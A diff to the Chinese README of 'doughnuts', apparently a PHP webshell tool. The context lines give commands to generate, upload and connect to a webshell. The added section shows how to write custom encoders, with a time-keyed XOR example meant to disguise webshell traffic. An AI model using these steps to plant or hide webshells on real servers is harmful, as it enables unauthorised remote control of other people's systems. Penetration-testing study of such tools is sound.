@@ -175,6 +175,39 @@ python3 doughnuts.py
     1. 在执行`python3 -m doughnuts.install`之后执行`doughnuts generate a.php POST pass salt 1`在当前目录下生成Pudding类型的webshell:a.php
     2. 上传a.php,根据提示执行 `doughnuts connect {木马url} POST pass doughnuts-salt `连接至webshell
 
+## 自定义编码器
+1. 进入doughnuts/encode目录
+2. 新建/拷贝一个py文件,起一个名字,以time.py为例
+3. 文件中只需要写一个run函数,类似于
+```python
+from libs.config import alias
+
+
+@alias(True)
+def run(data: str):
+    cipher = data
+    return cipher
+```
+4. 参数解释: data是传输的数据,为字符串,cipher为传出的数据,也应该为字符串
+5. 重启doughnuts即可使用`se/show_encoders`命令查看自定义的编码器,连接时使用`connect URL 请求方法 密码 编码器名字`即可使用自定义编码器
+6. 一个例子,以时间为秘钥的编码器
+```python
+from libs.config import alias
+from hashlib import md5
+from base64 import b64encode
+import time
+
+
+@alias(True)
+def run(data: str):
+    format_time = time.strftime("%Y-%m-%d %H:%M", time.localtime())
+    key = md5(format_time.encode()).hexdigest().encode()
+    data = data.encode()
+    cipher = bytes(data[i] ^ key[i % 32] for i in range(len(data)))
+    cipher = b64encode(cipher).decode()
+
+    return cipher
+```
 
 ## 自定义webshell模板
 1. 进入doughnuts/webshell_plugins目录
